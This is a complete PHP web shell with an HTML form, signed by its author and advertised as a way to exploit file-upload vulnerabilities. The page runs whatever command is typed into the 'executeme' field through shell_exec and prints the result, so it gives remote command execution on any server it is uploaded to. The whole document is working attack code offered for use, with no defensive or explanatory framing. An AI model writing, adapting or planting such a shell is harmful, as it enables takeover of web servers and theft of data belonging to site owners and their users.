<html>
<body>
<form method="GET">
<center><h1 > This webshell coded By Mahdi Jaber :) <a href="https://github.com/Mr6MJT">ClickHere</a> to visit my GitHub account.</h1>
<h1> By this webshell you can exploit fileupload vulnerability</h1></center>
<input type="text" name="executeme" placeholder="Enter command" style="width: 100%"> <input type="submit" value="Execute"> </form> 
</body>
</html>
<?php
    $execute = $_GET["executeme"];
    $output = shell_exec($execute);
    echo "The command: $execute\n";
    echo "<br>";
    echo "The output: $output";
?>
